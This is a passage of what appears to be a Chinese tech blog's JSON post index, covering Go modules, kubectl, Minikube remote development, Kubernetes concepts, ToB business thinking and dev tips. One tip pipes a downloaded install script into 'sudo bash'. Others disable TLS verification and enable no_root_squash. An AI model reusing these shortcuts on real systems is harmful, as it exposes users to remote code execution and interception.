模式下：\n在 GOPATH 目录下编译时，默认使用 vendor、GOPATH 进行包管理 在 GOPATH 目录外编译时，默认使用 go.mod 设置进行包管理。 在 Go modules 使用过程中，会自动生成两个文件 go.sum 和 go.mod。通常，会将这两个文件也提交到代码仓库。\ngo.mod go.mod 记录了依赖包的版本信息和操作命令。go.mod 提供了 module、require、replace、exclude 四个命令。\n1 2 3 4 cat go.mod module github.com/project/hello go 1.12 require rsc.io/quote v3.1.0+incompatible go.sum go.sum 提供了版本校验值。\n1 2 3 4 5 6 7 8 9 10 11 cat go.sum golang.org/x/text v0.0.0-20170915032832-14c0d48ead0c h1:qgOY6WgZOaTkIIMiVjBQcw 93ERBE4m30iBm00nkL0i8= golang.org/x/text v0.0.0-20170915032832-14c0d48ead0c/go.mod h1:NqM8EUOU14njkJ3 fqMW+pc6Ldnwhi/IjpwHt7yyuwOQ= rsc.io/quote v3.1.0+incompatible h1:5v8TkzZ3hgTuFV/P47Ib17+Lc9DHpLRa+HPYYhT/X9 o= rsc.io/quote v3.1.0+incompatible/go.mod h1:LzX7hefJvL54yjefDEDHNONDjII0t9xZLPX sUe+TKr0= rsc.io/sampler v1.3.0 h1:7uVkIFmeBqHfdjD+gZwtXXI+RODJ2Wc4O7MPEh/QiW4= rsc.io/sampler v1.3.0/go.mod h1:T1hPZKmBbMNahiBKFy5HrXp6adAjACjK9JXDnKaTXpA= 3. 配置代理 在安装 Go 依赖包时，会对外网请求数据。有些包托管在 github.com ，还有些包托管在 golang.org 、k8s.gcr.io 等仓库。由于 google 相关的网址被屏蔽，经常会遇到网络无法访问的问题。\n在 1.11 版本中，新增了一个环境变量 GOPROXY ，可以用来配置代码仓库镜像代理。\n以配置 jfrog 提供的 GoCenter 为例，在运行环境执行:\n1 export GOPROXY=https://gocenter.io 即可，使用 jfrog 提供的代理。除此，GoCenter 还提供了包搜索的功能。\n当然，aliyun 也提供了 GOPROXY :\n1 export GOPROXY=https://mirrors.aliyun.com/goproxy/ 4. Go modules 基本命令 Go modules 帮组文档，已经描述得十分详细。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 go help mod Go mod provides access to operations on modules. Note that support for modules is built into all the go commands, not just \u0026#39;go mod\u0026#39;. For example, day-to-day adding, removing, upgrading, and downgrading of dependencies should be done using \u0026#39;go get\u0026#39;. See \u0026#39;go help modules\u0026#39; for an overview of module functionality. Usage: go mod \u0026lt;command\u0026gt; [arguments] The commands are: download download modules to local cache(下载依赖包到本地) edit edit go.mod from tools or scripts(编辑 go.mod 文件) graph print module requirement graph(打印模块依赖图) init initialize new module in current directory(将当前目录初始化为新模块) tidy add missing and remove unused modules(拉取缺失的模块，移除没有使用到的模块) vendor make vendored copy of dependencies(将依赖包复制到 vendor) verify verify dependencies have expected content(验证依赖包) why explain why packages or modules are needed(解释为什么需要依赖) Use \u0026#34;go help mod \u0026lt;command\u0026gt;\u0026#34; for more information about a command. 新建一个目录 hello，目录中新增文件 hello.go 1 2 3 4 5 6 7 8 9 10 11 cat hello.go package main import ( \u0026#34;fmt\u0026#34; \u0026#34;rsc.io/quote\u0026#34; ) func main() { fmt.Println(quote.Hello()) } 初始化包为仓库地址 1 go mod init github.com/project/hello 编译，生成可执行文件 1 go build 将依赖包归档到项目 vendor 目录 1 2 3 4 5 6 7 8 go mod vendor -v # golang.org/x/text v0.0.0-20170915032832-14c0d48ead0c golang.org/x/text/language golang.org/x/text/internal/tag # rsc.io/quote v3.1.0+incompatible rsc.io/quote # rsc.io/sampler v1.3.0 rsc.io/sampler 验证依赖 1 2 go mod verify all modules verified 查看最终目录结构 1 2 3 4 5 6 7 8 9 10 tree -L 2 . ├── go.mod ├── go.sum ├── hello ├── hello.go └── vendor ├── golang.org ├── modules.txt └── rsc.io 5. 参考 https://blog.golang.org/using-go-modules ","description":"","id":375,"section":"post","tags":["博文","Go","GoModules","一起来学Go"],"title":"一起来学 Go --（3）Go Modules","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-3.html"},{"content":" 从最开始写博客至今，已经过去四、五年。我写博客的初衷是记录、思考、整理，给自己看更多一点，如果能帮上其他人就更好了。从最开始的 csdn ，到使用 Ghost 在 Linode 部署，再到 Pages 托管，最后落脚在 CDN 上。起初是为了能专心写，而后是希望通过一个网站了解更多技术细节，最后回归初心，只为能专心写内容。\n1. CSDN 博客 无论是写博客，还是检索问题，我们都无法避开第三方博客。国内常见的第三方博客有 csdn、cblogs、lofter 等，国外的有 wordpress、blogger 等。\n第三方博客的特点是：\n零成本。不需要购买域名、服务器等资源。 零维护。不需要维护服务器。 零推广。平台会将优秀的内容推荐给用户。借助第三方高权重域名，内容很快被搜索引擎收录，排名靠前。 从印象笔记迁移到 csdn 之后，整理和记录的笔记质量提升了很多。以前只是随手粘贴、复制的内容，开始逐渐变得条理清晰了一些。\n2. Ghost 独立部署 在 csdn 上持续更新了一段时间之后，恰逢我正在学习网站技术。于是，萌生了独立部署博客的想法。\n自己动手从零开始独立部署博客，可以学习到很多东西。\n从 VPS 开始了解阿里云、Linode、DigitalOcean 等; 从购买域名，开始了解如何选域名、域名的买卖、抢注域名、域名的解析、SEO 等; 从博客软件，开始了解到 Wordpress 、Ghost 等；从登陆服务器，开始了解到运维；从部署，开始了解到 Nginx、MySQL 等; 从图床，开始了解七牛、又拍等。除了自己独立部署，我还了解到一些一站式平台，例如，OpenShift。这也是我最早接触的 PaaS 平台。\n下面是我的部署方案图:\n3. Git Pages 托管 独立部署博客，需要购买域名、服务器等资源，每年是一笔额外的开销。同时，博客不是异地多活、高性能、高可用。\n于是，我选用了一种比较程序员的方式: Git Pages。\nGitHub、GitLab、Bitbucket 等，都提供了免费的静态页面托管服务，称之为 Pages 。利用 Pages 服务，可以发布文档、博客等。\n以 GitHub 为例，通常只需要简单几个步骤，就可以使用 Pages：\n新建一个项目：[username].github.io\n提交静态 html 文件\n访问 [username].github.io，也可以绑定自己的域名进行访问。\n如果你想要使用 Markdown 编辑文档，那么就需要借助 Jekyll、Hexo 等静态页面生成工具。\n更多 Git 技巧请参考: 你不知道的 Git 使用技巧\n这里我选用的是 Hexo，主要原因是 Hexo 基于 Nodejs，而 Jekyll 基于 Ruby，安装 Hexo 运行环境更方便。\n下面是我的部署方案图：\n最后，将博客全部迁移到了 Hexo 。参考文章：如何将博客从 Ghost 迁移到 Hexo\n4. CDN 采用 DNS 进行负载均衡，国内使用 coding.me，国外使用 gitlab.io，是一个不错的异地多活方案。\n但是这两个 Pages 服务都不稳定，而且慢。coding.me 的 Pages 服务，时不时就抽风一次，十几秒都打不开页面。gitlab.io 在国内访问体验不好，gitlab.com 都出现过服务中断，一直只是作为备份提供服务。\n由于 Pages 服务通常是免费的，提供商没有很强的意愿优化，改善体验。\n实际上，博客和文档类型的网站，通常都是以静态内容为主。网站中的静态内容，如 JS、CSS、图片等资源，我们通常都会放在 CDN 上。由此，我决定将静态 HTML 页面也放在 CDN 上，充分利用 CDN 的边缘节点，就近响应页面访问请求。\nCDN 提供商仅提供一定数量的 HTTP 免费流量，而我的主站采用的是 HTTPS。但网站每个页面大小不到 10 KB ，每个月仅增加几元钱的流量开销，就能获得访问速度很快的服务已经非常值了。\n下面是我的部署方案图:\n另外一种方式是利用 CDN 的镜像加速功能，将原来的网站镜像到 CDN，以 CDN 作为访问的入口。相较于直接使用 CDN 部署，这种方式改造少，但原来的网站一旦挂了也会影响到整个服务。最终，我还是选择了更简单的 CDN 直接部署的方案。\n","description":"","id":376,"section":"post","tags":["博文","方案"],"title":"如何一步一步地优化博客方案","uri":"https://www.chenshaowen.com/blog/how-to-optimize-the-blog-solution-step-by-step.html"},{"content":"1. 什么是 kubectl kubectl 是 Kubernetes 的命令行工具，通过 API server 与集群进行交互。\n2. 配置 kubectl kubectl 可以通过 ~/.kube/config 配置连接到一个或多个集群。\n具体如何配置可以参考: 配置对多集群的访问 。如果需要配置远程集群，可以参考: 搭建远程 Kubernetes 开发环境。\n查看配置的集群:\n1 2 3 kubectl config get-contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE * minikube minikube minikube 选择某个集群:\n1 2 kubectl config set-context minikube Context \u0026#34;minikube\u0026#34; modified. 3. kubectl 命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 kubectl kubectl controls the Kubernetes cluster manager. Find more information at: https://kubernetes.io/docs/reference/kubectl/overview/ Basic Commands (Beginner): create Create a resource from a file or from stdin. expose Take a replication controller, service, deployment or pod and expose it as a new Kubernetes Service run Run a particular image on the cluster set Set specific features on objects run-container Run a particular image on the cluster. This command is deprecated, use \u0026#34;run\u0026#34; instead Basic Commands (Intermediate): get Display one or many resources explain Documentation of resources edit Edit a resource on the server delete Delete resources by filenames, stdin, resources and names, or by resources and label selector Deploy Commands: rollout Manage the rollout of a resource rolling-update Perform a rolling update of the given ReplicationController scale Set a new size for a Deployment, ReplicaSet, Replication Controller, or Job autoscale Auto-scale a Deployment, ReplicaSet, or ReplicationController Cluster Management Commands: certificate Modify certificate resources. cluster-info Display cluster info top Display Resource (CPU/Memory/Storage) usage. cordon Mark node as unschedulable uncordon Mark node as schedulable drain Drain node in preparation for maintenance taint Update the taints on one or more nodes Troubleshooting and Debugging Commands: describe Show details of a specific resource or group of resources logs Print the logs for a container in a pod attach Attach to a running container exec Execute a command in a container port-forward Forward one or more local ports to a pod proxy Run a proxy to the Kubernetes API server cp Copy files and directories to and from containers. auth Inspect authorization Advanced Commands: apply Apply a configuration to a resource by filename or stdin patch Update field(s) of a resource using strategic merge patch replace Replace a resource by filename or stdin convert Convert config files between different API versions Settings Commands: label Update the labels on a resource annotate Update the annotations on a resource completion Output shell completion code for the specified shell (bash or zsh) Other Commands: api-versions Print the supported API versions on the server, in the form of \u0026#34;group/version\u0026#34; config Modify kubeconfig files help Help about any command plugin Runs a command-line plugin version Print the client and server version information Usage: kubectl [flags] [options] Use \u0026#34;kubectl \u0026lt;command\u0026gt; --help\u0026#34; for more information about a given command. Use \u0026#34;kubectl options\u0026#34; for a list of global command-line options (applies to all commands). 使用语法:\n1 kubectl [command] [TYPE] [NAME] [flags] command，指定要对一个或多个资源执行的操作，例如 create、get、describe、delete。 TYPE，指定资源类型。资源类型不区分大小写，可以指定单数、复数或缩写形式。例如: kubectl get pod pod_name 。 NAME，指定资源的名称。名称区分大小写。如果省略名称，则显示所有资源的详细信息。例如: kubectl get pods 。 flags，指定可选的参数。例如，可以使用 -s 或 -server 参数指定 Kubernetes API 服务器的地址和端口。 4. kubectl 部署 Jenkins 创建 Namespace ，隔离服务 1 kubectl create namespace jenkins 使用 Deployment 部署 Jenkins 新增 jenkins-deployment.yaml 文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 cat jenkins-deployment.yaml apiVersion: extensions/v1beta1 kind: Deployment metadata: name: jenkins-deployment spec: replicas: 1 selector: matchLabels: app: jenkins template: metadata: labels: app: jenkins spec: containers: - name: jenkins image: jenkins:2.60.3 ports: - containerPort: 8080 执行命令，部署 Deployment。\n1 2 kubectl create -f jenkins-deployment.yaml --namespace=jenkins deployment.extensions/jenkins-deployment created 查看相关信息 1 kubectl describe deployments --namespace=jenkins 创建 service 暴露服务 新增 jenkins-service.yaml 文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cat jenkins-service.yaml apiVersion: v1 kind: Service metadata: name: jenkins spec: type: NodePort ports: - port: 8080 targetPort: 8080 nodePort: 30000 selector: app: jenkins 执行命令，部署 service ，nodePort 参数指定对外的服务端口。\n1 kubectl create -f jenkins-service.yaml --namespace=jenkins 访问服务 在浏览器打开链接: http://your_node_host_ip:30000 ，发现需要输入初始密码。\n从日志获取访问初始密码 查看 Pod 名称:\n1 2 3 kubectl get pods --namespace=jenkins NAME READY STATUS RESTARTS AGE jenkins-deployment-868cc579df-42lpn 1/1 Running 0 21m 获取密码:\n1 kubectl log jenkins-deployment-868cc579df-42lpn --namespace=jenkins 在日志中，可以查看到初始化密码。\n5. 重启 Kubernetes 中的 Job 安装 jq 以 CentOS 7 为例：\n1 2 yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm yum install -y jq 查看 Job 1 2 3 kubectl get job job_name 从起 Job 1 kubectl get job job_name -o json | jq \u0026#39;del(.spec.selector)\u0026#39; | jq \u0026#39;del(.spec.template.metadata.labels)\u0026#39; | kubectl replace --force -f - 6. 参考 https://kubernetes.io/docs/reference/kubectl/overview/ https://devopscube.com/setup-jenkins-on-kubernetes-cluster/ https://serverfault.com/questions/809632/is-it-possible-to-rerun-kubernetes-job ","description":"","id":377,"section":"post","tags":["整理","Kubernetes","kubectl","实践"],"title":"kubectl 实用指南","uri":"https://www.chenshaowen.com/blog/practice-guide-to-kubectl.html"},{"content":"1. 集群 1.1 Master Master 负责管理和维护 Kubernetes 集群信息，并向 Node 下放任务和接收反馈信息。\nMaster 上运行的组件有 kube-apiserver、kube-scheduler、kube-controller-manager、cloud-controller-manager 等。\n1.2 Node Node 负责集群负载，可以是物理机，也可以是虚拟机。为了管理 Pod ，每个 Node 都会运行 Container Runtime、Kubelet、Kube-proxy 。\n2. 基本组件 2.1 kube-apiserver kube-apiserver 为 Kubernetes 集群提供了 RESTful API，是操作集群的唯一入口。\n2.2 kube-scheduler kube-scheduler 负责分配调度 Pod 到集群内的节点上。它监听 kube-apiserver，查询还未分配 Node 的 Pod，然后根据调度策略为这些 Pod 分配节点。\n2.3 kube-controller-manager kube-controller-manager 通过 apiserver 监控整个集群的状态，并确保集群处于预期的工作状态。\n2.4 cloud-controller-manager cloud-controller-manager 主要负责与底层云提供商的平台交互。\n2.5 kubelet kubelet 运行在 Node 节点，在 apiserver 上注册节点信息，定期向 Master 上报节点的资源使用情况。此外，kubelet 还接受并执行 Master 节点发送的指令，管理 Pod 和 Pod 中的容器。\n2.6 kube-proxy kube-proxy 运行在 Node 节点上，负责 service 的通信和负载均衡。\n2.7 kube-dns kube-dns 为 Kubernetes 提供命名服务。\n2.8 kubeadm kubeadm 是一个构建 Kubernetes 集群的工具。它提供的 kubeadm init 和 kubeadm join 两个命令是快速构建 Kubernetes 集群的最佳实践。kubeadm 只关心集群中最基础的组件，不涉及 dashboard、CNI 等插件。\n2.9 federation Kubernetes 的设计定位是单一集群在同一个地域内。同一个地区的网络性能才能满足 Kubernetes 的调度和计算存储连接要求。\nfederation 提供了跨集群同步资源、跨集群服务发现的功能，可以用于管理多集群。\n2.10 kubectl kubectl 是 Kubernetes 的命令行工具。\n3. 基础对象 3.1 Pod Pod 是 Kubernetes 中最基本的调度单元。\nPod 可以运行多个 Docker 容器，容器间共享 PID、IPC、Network 和 UTS namespace。Pod 在创建时会被分配一个 IP 地址，Pod 间的容器可以相互通信。\n3.2 Service Service 用于将一组 Pod 暴露为一个服务。由于 Pod 的 IP 会随着 Pod 的重启而变化，不能直接对外提供服务。Service 为一组 Pod 提供了一个统一的访问入口。Kube-proxy 完成多个 Pod 上的负载均衡。\n3.3 Label Label 标签以 key/value 的方式附加到对象上，用于识别 Kubernetes 对象。Label Selector 可以用于选择一组相同 Label 的对象。\n3.4 Replication Controller Replication Controller 用于保证一定数量的 Pod 在集群中正常运行。Replication Controller 会持续监听 Pod 的运行状态，当 Pod 发生故障数量减少时，重新运行新的 Pod 副本。\n3.5 Replica Set Replica Set 是 Replication Controller 的升级版本。Replication Controller 仅支持 equality-based 的选择器，而 Replica Set 支持 labels user guide 中描述的 set-based 选择器。\n3.6 Deployment Deployment 是 Kubernetes 中用于处理无状态服务的资源，提供了更新 Pod 和 Replica Set 的方法，集成了上线部署、滚动升级、创建副本、暂停上线任务，恢复上线任务、回滚到以前某一版本等功能。\n3.7 Job Job 用于批量处理短暂的一次性任务，并保证指定数量的 Pod 成功结束。\n3.8 DaemonSet DaemonSet 可以保证集群中所有的或者部分的节点都能够运行同一份 Pod 副本，每当有新的节点被加入到集群时，Pod 就会在目标的节点上启动。\n3.9 StatefulSet StatefulSet 是用于支持有状态服务的资源，所管理的 Pod 拥有固定的Pod 名称，启停顺序。\n4. 参考 https://kubernetes.io/zh/docs/ https://feisky.gitbooks.io/kubernetes/ ","description":"","id":378,"section":"post","tags":["整理","Kubernetes","概念","学习"],"title":"Kubernetes 中的基本概念","uri":"https://www.chenshaowen.com/blog/basic-concepts-in-kubernetes.html"},{"content":" Minikube 是 Kubernetes 的单机发行版本，适用于产品体验和日常开发。这里使用 Minikube 搭建开发环境，将 Kubernetes 搭建在 CentOS 云服务器，本地使用 OS X 进行远程开发。\n1. 云服务器安装 Minikube 在 Minikube 的 GitHub 版本页面，找到合适的版本，进行安装。\n以 CentOS 为例，执行命令:\n1 curl -Lo minikube https://storage.googleapis.com/minikube/releases/v1.2.0/minikube-linux-amd64 \u0026amp;\u0026amp; chmod +x minikube \u0026amp;\u0026amp; sudo cp minikube /usr/local/bin/ \u0026amp;\u0026amp; rm minikube minikube 是一个可执行的二进制文件，下载之后，添加可执行权限即可。Docker 安装，请参考这里。\n2. 云服务器运行 Minikube 通过参数 --vm-driver ，指定 minikube 使用 CentOS 上已经安装的 Docker 环境。执行命令，启动 Minikube:\n1 minikube start --vm-driver=none 启动 Dashboard:\n1 minikube dashboard 如果无法启动，可以尝试执行 kubectl proxy --address='0.0.0.0' --disable-filter=true ，在页面访问 http://127.0.0.1:8001/api/v1/namespaces/kube-system/services/http:kubernetes-dashboard:/proxy/ 。\n尝试部署一个应用:\n1 kubectl run kube-nginx --image=nginx:latest --port=80 查看 POD 信息:\n1 2 3 kubectl get pods NAME READY STATUS RESTARTS AGE kube-nginx-7c765ffd95-v6gc9 1/1 Running 1 2m 3. 本地安装 kubectl kubectl 是 Kubernetes 集群的客户端管理工具。kubectl 与 Kubernetes 构成一个 CS 的架构模型，可以在不同的机器上运行。\n以 OS X 为例安装 kubectl ，执行命令:\n1 brew install kubernetes-cli 4. 本地配置 kubectl 拷贝服务器上的 minikube 认证信息，本地执行:\nmkdir ~/.kube scp -r root@your_host_ip:/root/.kube/config ~/.kube/config mkdir ~/.minikube scp -r root@your_host_ip:/root/.minikube/\\{ca.crt,client.crt,client.key\\} ~/.minikube/ 修改 kubectl 配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 cat ~/.kube/config apiVersion: v1 clusters: - cluster: # 修改为 ca.crt 的正确路径 # certificate-authority: ../.minikube/ca.crt # 修改为服务器的 IP 地址 server: https://your_host_ip:8443 # 不校验证书，否则会提示 x509 校验失败 insecure-skip-tls-verify: true name: minikube contexts: - context: cluster: minikube user: minikube name: minikube current-context: minikube kind: Config preferences: {} users: - name: minikube user: # 修改为 client.crt 的正确路径 client-certificate: ../.minikube/client.crt # 修改为 client.key 的正确路径 client-key: ../.minikube/client.key 查看远程 Kubernetes 集群中的 Pod 信息:\n1 2 3 kubectl get pods NAME READY STATUS RESTARTS AGE kube-nginx-7c765ffd95-2pxfk 1/1 Running 0 11m 5. 参考 Windows 7 下使用 MiniKube 学习 Kubernetes ","description":"","id":379,"section":"post","tags":["博文","Kubernetes","研发","环境","实践"],"title":"搭建远程 Kubernetes 开发环境","uri":"https://www.chenshaowen.com/blog/building-a-remote-kubernetes-development-environment.html"},{"content":"1. 关于 ToB 的认识 ToC 的钱越来越难赚，才导致了 ToB 的繁荣。\n凭一个想法，做出好的产品，最终被大家普遍接受的时代已被巨轮碾过。在互联网发展早期，一个门户黄页就成就了搜狐，一个聊天工具就成就了腾讯，甚至一个只有几个跳转页面的 hao123 都能卖几千万。后来的移动互联网，一个 APP 就是一家公司，一个公众号就能养活一帮人。到现在的后互联网时代，巨头已经林立，任你想法万千，资金百万，也难再起波澜。\n我们生活在一个急剧变革的时代。物质在急剧丰富，文化在快速演进。企业的技术、商业模式创新，更迭换代，都更加迅速。ToB 市场为此而生，服务这些企业，提升企业的研发、销售、经营、决策等商业活动的效率。ToB 的服务，可以帮助企业更快地响应市场变化，聚焦业务本身。\n有人说，ToB 的本质是 ToC 。这样理解也没错，意思是: 服务企业的核心是帮助企业服务好其客户，客户满意，企业成功，ToB 公司才能成功。 Customer success 与此异曲同工。\n2. 大公司 VS 小公司 大公司是横向的，小公司是纵向的。不见其疆者，是为大。大公司人多、资金充沛，在领域占据优势。大公司发展到一定阶段，必然触碰到行业天花板，依靠原始积累进行横向扩展。庖丁见其牛者，是为小。小公司为了生存，更加专注擅长的领域，持续耕耘，持续成长。\n大公司是中长期投资者，小公司是短中期投资者。大公司更重视员工潜力，愿意招聘毕业生，花费人力、财力培养，在培训、成长计划方面投入更大。小公司更重视即时解决问题，人力方面没有太多冗余，每个人都是成本。\n大公司依然是一所院校，小公司才是真正毕业。大公司和学校没有太多差别，除了工作，其他事情都有人帮你跟进，就像在学校只用专心读书一样。小公司的行政、制度不完善，自己动手，才能丰衣足食，需要更强的主人翁意识。\n大公司是小公司成长的方向，小公司是大公司的创新源泉。大公司是从小公司逐步成长而来，大公司的组织形态具有一定的必然性，是小公司可以学习借鉴的地方。小公司为了生存，更加努力创新，给行业注入活力，在夹缝中求得一丝成长空间。\n3. 腾讯蓝鲸的 ToB 模式 腾讯因 ToC 而大，如今走上 ToB 。腾讯蓝鲸是腾讯 ToB 战略中的重要环节。\n在体系架构图中，腾讯蓝鲸主要分为四大部分，管控平台、基础平台、集成平台、应用场景，分别对应内部的几个小组，完全遵循康威定律进行组织和设计。最底层的管控平台，负责机器上的 agent ，向上提供管道，传输文件，执行脚本等。基础平台是运维领域的实现，有管理机器的配置平台，有执行脚本的 Job 平台，有数据采集分析的数据平台。集成平台主要用于提供 aPaaS 和 iPaaS。aPaaS 负责提供上层 SaaS 的运行时，以及相关提测、部署、日志查询等服务；iPaaS 主要负责集成 API，将基础平台和外部的功能以接口的形式，向上输出给 SaaS 。最上层的 SaaS 负责组装 API ，直面用户场景，解决业务需求。\n腾讯蓝鲸的思路是提供一体化的运营体系工具，做企业内部的操作系统。\n平台级别的产品最重要的是生态。可以类比 Windows、iOS ，它们构建了企业、开发者、用户三者之间的正向循环经济生态，才获得了巨大成功。\n蓝鲸的生态分为两部分：内部和外部。\n对内，服务腾讯运营研发体系。一方面，借助腾讯品牌，与高校合作，宣导蓝鲸，拓展毕业生生源，方便部门招聘。另一方面，培养实习生、新人，将他们释放到内部，给内部注入蓝鲸的种子，同时留下优秀的开发者直接参与蓝鲸的研发。\n对外，开源、发展服务商。蓝鲸的负责人具有 ToB 的服务背景，同时，公司投入的人力有限，采用一级服务商的模式。蓝鲸只专注于产品研发，打造产品影响力，让服务商去直面客户。按照服务商级别，蓝鲸每年收取一定费用，几十万到一百多万不等。服务商拿着蓝鲸产品去企业竞标，做定制化开发、维护等赚钱。\n其中定制化开发分为两种，一种是基于蓝鲸体系的全新 SaaS 开发，全新 SaaS 开发可以丰富蓝鲸的应用场景。另一种是基于蓝鲸精品 SaaS 的二次开发，服务商员工被外派到蓝鲸，作为外包人力参与项目。在补充蓝鲸人力的同时，服务商员工也得到了培养。\n内、外两部分，相互促进和影响。内部被认可，对外背书更强；外部被认可，内部更容易接受蓝鲸改造。蓝鲸投入的员工绝大部分都是工程师，服务内部，成本摊到腾讯游戏，可持续性、生存能力很强。对外竞争时，即使某些功能不够好，但是蓝鲸没有生存压力，可以用时间换市场。\n腾讯蓝鲸的优势是低成本、强背书，通过建设内、外生态，打造企业级操作系统。\n4. 青云的 ToB 模式 相较于腾讯蓝鲸以内部为低成本试验场，青云面对的市场竞争更加激烈。同样是 2012 年创业的青云，有着不一样的 ToB 思路。ToB 业务是青云的核心业务，促使青云持续地深耕细作。\n创业伊始，青云做公有云 IaaS ，完成计算、存储、网络、安全等组件的开发，而后进军私有云。2016 年，青云实现盈利。\n私有云补贴公有云是青云的策略。公有云是一个成熟、标准化的市场，利润薄、竞争大；私有云利润大，可以补贴公有云。同时，私有云进入企业内部后，培养了用户，可以进一步促进公有云业务。\n青云更加面向客户，面向市场。青云依托于网络、存储、骨干网等核心技术，打造上层的企业服务场景，逐渐形成易捷版、标准版、高级版、企业版等不同版本的分类布局。通过服务收费、私有化部署，获取利润。类似的产品有，云管平台、容器平台、青立方等。\n青云的优势是技术积累、市场敏感，在已有的基础设施之上，能快速构建产品，满足客户需求。\n","description":"","id":380,"section":"post","tags":["思考","ToB","商业模式","博文"],"title":"大公司和小公司的 ToB 思路","uri":"https://www.chenshaowen.com/blog/tob-thinking-of-large-and-small-companies.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. pandoc 简单使用技巧 Pandoc 是由 John MacFarlane 开发的标记语言转换工具，可实现不同标记语言间的格式转换，堪称该领域中的 “瑞士军刀”。\nPandoc 使用 Haskell 语言编写，以命令行形式实现与用户的交互，可支持多种操作系统。\n下载地址: https://github.com/jgm/pandoc/releases/ 。\nPandoc 的基本指令格式是：\n1 pandoc [options] [input-file] ... 简单的格式转换：\n1 pandoc -o output.html input.md 其中 -o ouput.html 表示输出文件为 output.html，input.md 是输入文件。\nPandoc 会根据文件的后缀名自动判断格式，用户也可以显式地指定输入文件和输出文件格式：\n1 pandoc -f markdown -t docx -o output.docx input.md 其中 -f markdown 表示输入文件格式为 Markdown，-t html 表示输出文件格式为 HTML。\n详细的指令参数请参见 Pandoc 用户手册。\n2. 会话管理工具 tmux tmux 是一个终端复用工具。用户可以通过 tmux 在一个终端内管理多个分离的会话，窗口及面板，对于同时使用多个命令行，或多个任务时非常方便。\n在 OS X 中使用 brew 进行安装：\n1 brew install tmux 下面是一些常用的命令：\n创建一个新的会话 1 tmux new -s session_name 断开当前会话 1 tmux detach (快捷键：Ctrl+b+d) 进入会话 1 tmux attach-session -t session_name 简写 tmux a -t session_name\n关闭会话 1 tmux kill-session -t session_name 查看所有会话 1 tmux list-session 简写 tmux ls（快捷键：Ctrl+b+s）\n关闭所有会话 1 tmux kill-server 切换到某一会话 1 tmux switch -t session_name 重命名会话 1 tmux rename -t oldName newName 如果提示 sessions should be nested with care, unset $TMUX to force ，执行 unset TMUX 即可。\n3. 服务器新增磁盘 查找新磁盘的盘符 1 fdisk -l 这里以 /dev/vdc 为例\n设置 1 fdisk /dev/vdc 依次选择\nn add a new partition p primary partition (1-4)，根据需要选择 格式化 1 mke2fs -j /dev/vdc 挂载 新建目录 mkdir /local_dir，用于挂载磁盘。\n1 mount /dev/vdc /local_dir 4. 搭建 NFS 服务 安装 NFS CentOS 执行命令：\n1 yum install -y nfs-utils Ubuntu 执行命令：\n1 apt-get install -y nfs-kernel-server 开机自启动 NFS 1 systemctl start nfs-server.service \u0026amp; systemctl enable nfs-server.service 编辑 /etc/exports ，挂载目录配置 1 2 3 cat /etc/exports /data/ 192.168.10.0/24(rw,sync,no_root_squash,no_all_squash) /data，服务器上，需要共享的目录 192.168.10.0/24，客户端 IP 范围，* 代表所有，即没有限制 rw，权限设置，可读可写 sync，同步共享目录 no_root_squash，可以使用 root 授权 no_all_squash，可以使用普通用户授权 修改配置文件之后，需要重启服务，才能生效。\n1 systemctl restart nfs-server OS X 客户端挂载、卸载 挂载 1 mount_nfs 服务器IP:服务器目录 客户端目录 例如，mount_nfs 1.2.3.4:/data /Users/username/nfs/\n卸载 1 umount /Users/username/nfs/ 5. 使用 rclone 挂载 OneDrive 到服务器 Rclone 能够方便的管理 OneDrive、Google Drive、Amazon Drive 等各种云盘和对象存储，支持挂载盘符、命令行上传下载文件。\n安装 1 curl https://rclone.org/install.sh | sudo bash 本地授权 需要先安装 rclone ，然后执行：\n1 rclone authorize \u0026#34;onedrive\u0026#34; 在页面登陆 OneDrive 账号，授权成功后，将整个 Token: {\u0026quot;access_token\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;expiry\u0026quot;:\u0026quot;\u0026quot;} 拷贝备用。\n服务器端配置 需要先安装 rclone ，然后执行：\n1 rclone config 按照提示输入相关信息，仅当提示如下信息时：\n1 2 3 4 5 Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes n) No 选择 n，在 result 中输入上面拷贝的 Token Json 字符串。继续配置，最后保存即可。\n挂载 OneDrive 1 rclone mount DriveName:Folder LocalFolder --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 \u0026amp; DriveName 是新增时填入的 name Folder 为 OneDrive 上的文件夹 LocalFolder 为服务器上的文件夹 例如，rclone mount onedrive:Code /data --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000\u0026amp; ，就是将 OneDrive 上 Code 目录挂载到本地 /data 目录。\n如果提示 fuse 相关错误，执行 yum install -y fuse 即可解决。\n","description":"","id":381,"section":"post","tags":["博文","Tips","Pandoc","Tmux","硬盘"],"title":"开发 Tips（9）","uri":"https://www.chenshaowen.com/blog/developing-tips-9.html"},{"content":"英文书名: The Way To Go\n副标题: A Thorough Introduction To The Go Programming Language\n作者: Ivo Balbaert\n出版社: iUniverse\n出版年: 2012-3-8\nISBN: 9781469769165\nNotes:\n这是一本个人比较推荐的 Go 入门书籍。由于 Go 最近几年发展迅速，原著中有部分内容已经过时。我阅读的是中文翻译版本。中文版根据当前 Go 语言版本进行了修改。\n书中，作者对 Go 语言的数据结构、语言特性、错误处理、编程模型等做了非常详细的阐述，同时，还给出了一些实践建议。\n","description":"","id":382,"section":"post","tags":["书籍","Go","入门"],"title":"Go 入门指南","uri":"https://www.chenshaowen.com/blog/book/the-way-to-go.html"},{"content":"1. Go 的数据结构 基础类型\n布尔类型：bool 整型：byte、int、int8、int16、uint、uintptr 浮点类型：float32、float64 复数类型：complex64、complex128 字符串：string 字符类型：rune 错误类型：error 